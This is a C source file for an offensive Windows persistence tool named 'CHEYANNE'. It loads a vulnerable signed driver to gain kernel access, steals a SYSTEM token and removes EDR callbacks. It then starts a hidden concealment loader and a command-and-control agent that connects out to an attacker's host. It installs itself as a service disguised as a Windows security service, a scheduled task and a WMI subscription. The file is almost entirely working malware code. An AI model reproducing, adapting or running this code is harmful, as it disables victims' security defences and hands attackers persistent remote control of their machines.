/*
 * cheyanne_persist.c — CHEYANNE Boot Persistence Orchestrator
 * 22DIV / george wu
 *
 * Compiled binary that chains all persistence layers:
 *   1. Load BYOVD driver → acquire kernel R/W
 *   2. Steal SYSTEM token for current process
 *   3. Remove EDR kernel callbacks
 *   4. Launch cloak_loader.exe (system-wide concealment)
 *   5. Launch cheyanne_agent.py (C2 callback)
 *
 * Install methods:
 *   --install-svc     Create as Windows service (boot-start)
 *   --install-task    Create as scheduled task (SYSTEM logon)
 *   --install-wmi     Create as WMI event subscription
 *   --run             Execute chain immediately (for testing)
 *   --uninstall       Remove all persistence
 *
 * Target: Windows 11 24H2 Build 26200
 */

#include "byovd.h"
#include <stdio.h>
#include <stdlib.h>
#include <shlwapi.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")

#define PERSIST_SVC_NAME    "WindowsSecHealthSvc"
#define PERSIST_SVC_DISPLAY "Windows Security Health Service"
#define PERSIST_TASK_NAME   "\\Microsoft\\Windows\\WindowsUpdate\\SecurityHealthCheck"

static char g_base_dir[MAX_PATH];

static void resolve_base_dir(void)
{
    GetModuleFileNameA(NULL, g_base_dir, MAX_PATH);
    char *slash = strrchr(g_base_dir, '\\');
    if (slash) *(slash + 1) = '\0';
}

static BOOL file_exists(const char *path)
{
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

/* ================================================================
 * CHAIN EXECUTION — the boot sequence
 * ================================================================ */

static int run_chain(const char *driver_filename, const char *c2_host, int c2_port)
{
    resolve_base_dir();
    char driver_path[MAX_PATH], cloak_path[MAX_PATH], agent_path[MAX_PATH];

    snprintf(driver_path, MAX_PATH, "%s%s", g_base_dir, driver_filename);
    snprintf(cloak_path, MAX_PATH, "%s..\\cloak\\bin\\cloak_loader.exe", g_base_dir);
    snprintf(agent_path, MAX_PATH, "%s..\\cheyanne_agent.py", g_base_dir);

    if (!file_exists(driver_path)) {
        printf("  [!] Driver not found: %s\n", driver_path);
        return 1;
    }

    /* --- STEP 1: Load BYOVD driver --- */
    printf("  [PERSIST] Step 1: Loading BYOVD driver\n");

    BYOVD_DRIVER drv_type;
    if (strstr(driver_filename, "RTCore64") || strstr(driver_filename, "rtcore64"))
        drv_type = DRIVER_RTCORE64;
    else if (strstr(driver_filename, "dbutil") || strstr(driver_filename, "DBUtil"))
        drv_type = DRIVER_DBUTIL23;
    else {
        printf("  [!] Unknown driver: %s\n", driver_filename);
        return 1;
    }

    wchar_t wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, driver_path, -1, wpath, MAX_PATH);

    BYOVD_CTX ctx;
    byovd_init(&ctx, drv_type, wpath);

    if (!byovd_load_driver(&ctx)) {
        printf("  [!] Driver load failed — continuing without kernel ops\n");
        goto skip_kernel;
    }

    if (!byovd_open_device(&ctx)) {
        printf("  [!] Device open failed\n");
        goto skip_kernel;
    }

    /* --- STEP 2: Token theft --- */
    printf("  [PERSIST] Step 2: Stealing SYSTEM token\n");
    if (kernel_find_ntoskrnl(&ctx)) {
        kernel_steal_token(&ctx, GetCurrentProcessId());
    }

    /* --- STEP 3: Callback removal --- */
    printf("  [PERSIST] Step 3: Removing EDR callbacks\n");
    kernel_remove_callbacks(&ctx);

    byovd_unload(&ctx);

skip_kernel:

    /* --- STEP 4: Launch cloak (if available) --- */
    if (file_exists(cloak_path)) {
        printf("  [PERSIST] Step 4: Launching cloak\n");
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(cloak_path, NULL, NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            printf("  [+] Cloak launched (PID %lu)\n", pi.dwProcessId);
        } else {
            printf("  [!] Cloak launch failed (%lu)\n", GetLastError());
        }
    } else {
        printf("  [*] Cloak not found — skipping\n");
    }

    /* --- STEP 5: Launch C2 agent --- */
    if (file_exists(agent_path)) {
        printf("  [PERSIST] Step 5: Launching C2 agent\n");
        char cmd[1024];
        snprintf(cmd, sizeof(cmd),
            "pythonw \"%s\" %s %d --reconnect", agent_path, c2_host, c2_port);

        STARTUPINFOA si2 = { sizeof(si2) };
        PROCESS_INFORMATION pi2;
        si2.dwFlags = STARTF_USESHOWWINDOW;
        si2.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2)) {
            CloseHandle(pi2.hProcess);
            CloseHandle(pi2.hThread);
            printf("  [+] Agent launched (PID %lu) → %s:%d\n",
                pi2.dwProcessId, c2_host, c2_port);
        } else {
            printf("  [!] Agent launch failed (%lu)\n", GetLastError());
        }
    } else {
        printf("  [*] Agent not found: %s\n", agent_path);
    }

    printf("  [PERSIST] Chain complete\n");
    return 0;
}

/* ================================================================
 * INSTALL — Service (boot-start, runs as SYSTEM)
 * ================================================================ */

static BOOL install_service(const char *driver, const char *c2_host, int c2_port)
{
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    char svc_cmd[1024];
    snprintf(svc_cmd, sizeof(svc_cmd),
        "\"%s\" --run %s %s %d", exe_path, driver, c2_host, c2_port);

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        printf("  [!] OpenSCManager failed — need admin\n");
        return FALSE;
    }

    SC_HANDLE hSvc = OpenServiceA(hSCM, PERSIST_SVC_NAME, SERVICE_ALL_ACCESS);
    if (hSvc) {
        SERVICE_STATUS ss;
        ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
        DeleteService(hSvc);
        CloseServiceHandle(hSvc);
    }

    hSvc = CreateServiceA(
        hSCM, PERSIST_SVC_NAME, PERSIST_SVC_DISPLAY,
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
        svc_cmd, NULL, NULL, NULL, NULL, NULL
    );

    if (!hSvc) {
        printf("  [!] CreateService failed (%lu)\n", GetLastError());
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    SERVICE_DESCRIPTION sd;
    sd.lpDescription = "Provides security health monitoring and automatic updates for Windows Security.";
    ChangeServiceConfig2A(hSvc, SERVICE_CONFIG_DESCRIPTION, &sd);

    printf("  [+] Service installed: %s (AUTO_START)\n", PERSIST_SVC_NAME);
    printf("      Command: %s\n", svc_cmd);

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    return TRUE;
}

/* ================================================================
 * INSTALL — Scheduled Task (runs at SYSTEM logon)
 * ================================================================ */

static BOOL install_task(const char *driver, const char *c2_host, int c2_port)
{
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "schtasks /create /tn \"%s\" "
        "/tr \"\\\"%s\\\" --run %s %s %d\" "
        "/sc onstart /ru SYSTEM /rl highest /f",
        PERSIST_TASK_NAME, exe_path, driver, c2_host, c2_port);

    int rc = system(cmd);
    if (rc == 0) {
        printf("  [+] Scheduled task installed: %s\n", PERSIST_TASK_NAME);
        return TRUE;
    }

    printf("  [!] schtasks failed (%d)\n", rc);
    return FALSE;
}

/* ================================================================
 * INSTALL — WMI Event Subscription
 * ================================================================ */

static BOOL install_wmi(const char *driver, const char *c2_host, int c2_port)
{
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);

    char ps_cmd[2048];
    snprintf(ps_cmd, sizeof(ps_cmd),
        "powershell -ep bypass -c \""
        "$f = Set-WmiInstance -Namespace root/subscription -Class __EventFilter "
        "-Arguments @{Name='CheyanneBoot'; EventNameSpace='root/cimv2'; "
        "QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent "
        "WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''}; "
        "$c = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer "
        "-Arguments @{Name='CheyanneBootConsumer'; CommandLineTemplate='\\\"%s\\\" --run %s %s %d'}; "
        "Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding "
        "-Arguments @{Filter=$f; Consumer=$c}\"",
        exe_path, driver, c2_host, c2_port);

    int rc = system(ps_cmd);
    if (rc == 0) {
        printf("  [+] WMI event subscription installed: CheyanneBoot\n");
        return TRUE;
    }

    printf("  [!] WMI install failed (%d)\n", rc);
    return FALSE;
}

/* ================================================================
 * UNINSTALL — Remove all persistence
 * ================================================================ */

static void uninstall_all(void)
{
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceA(hSCM, PERSIST_SVC_NAME, SERVICE_ALL_ACCESS);
        if (hSvc) {
            SERVICE_STATUS ss;
            ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
            DeleteService(hSvc);
            CloseServiceHandle(hSvc);
            printf("  [+] Service removed: %s\n", PERSIST_SVC_NAME);
        }
        CloseServiceHandle(hSCM);
    }

    char cmd[512];
    snprintf(cmd, sizeof(cmd), "schtasks /delete /tn \"%s\" /f 2>nul", PERSIST_TASK_NAME);
    system(cmd);
    printf("  [+] Scheduled task removed\n");

    system("powershell -ep bypass -c \""
        "Get-WmiObject -Namespace root/subscription -Class __EventFilter "
        "| Where-Object { $_.Name -eq 'CheyanneBoot' } | Remove-WmiObject; "
        "Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer "
        "| Where-Object { $_.Name -eq 'CheyanneBootConsumer' } | Remove-WmiObject; "
        "Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding "
        "| Where-Object { $_.Filter.Name -eq 'CheyanneBoot' } | Remove-WmiObject\" 2>nul");
    printf("  [+] WMI subscription removed\n");
}

/* ================================================================
 * MAIN
 * ================================================================ */

int main(int argc, char *argv[])
{
    printf("\n  CHEYANNE PERSIST — Boot Chain Orchestrator\n");
    printf("  ========================================\n\n");

    if (argc < 2) {
        printf("  Usage:\n");
        printf("    cheyanne_persist.exe --run <driver.sys> <c2_host> <c2_port>\n");
        printf("    cheyanne_persist.exe --install-svc <driver.sys> <c2_host> <c2_port>\n");
        printf("    cheyanne_persist.exe --install-task <driver.sys> <c2_host> <c2_port>\n");
        printf("    cheyanne_persist.exe --install-wmi <driver.sys> <c2_host> <c2_port>\n");
        printf("    cheyanne_persist.exe --uninstall\n");
        return 1;
    }

    const char *mode = argv[1];

    if (strcmp(mode, "--uninstall") == 0) {
        uninstall_all();
        return 0;
    }

    if (argc < 5) {
        printf("  [!] Need: <driver.sys> <c2_host> <c2_port>\n");
        return 1;
    }

    const char *driver = argv[2];
    const char *host = argv[3];
    int port = atoi(argv[4]);

    if (strcmp(mode, "--run") == 0) {
        return run_chain(driver, host, port);
    } else if (strcmp(mode, "--install-svc") == 0) {
        install_service(driver, host, port);
    } else if (strcmp(mode, "--install-task") == 0) {
        install_task(driver, host, port);
    } else if (strcmp(mode, "--install-wmi") == 0) {
        install_wmi(driver, host, port);
    } else {
        printf("  [!] Unknown mode: %s\n", mode);
        return 1;
    }

    return 0;
}
